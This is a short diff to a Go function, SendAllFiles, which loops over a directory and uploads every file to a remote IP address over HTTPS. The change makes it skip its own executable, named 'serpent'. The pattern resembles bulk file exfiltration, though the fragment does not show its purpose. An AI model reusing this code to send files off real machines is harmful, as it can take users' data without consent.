@@ -44,6 +44,9 @@ func SendAllFiles(ip string) error {
 		if entry.IsDir() {
 			continue // Skip directories
 		}
+		if entry.Name() == "serpent" {
+			continue // Skip the serpent executable itself
+		}
 		filePath := entry.Name()
 		url := "https://" + ip
 		err := https.SendFile(url, filePath)
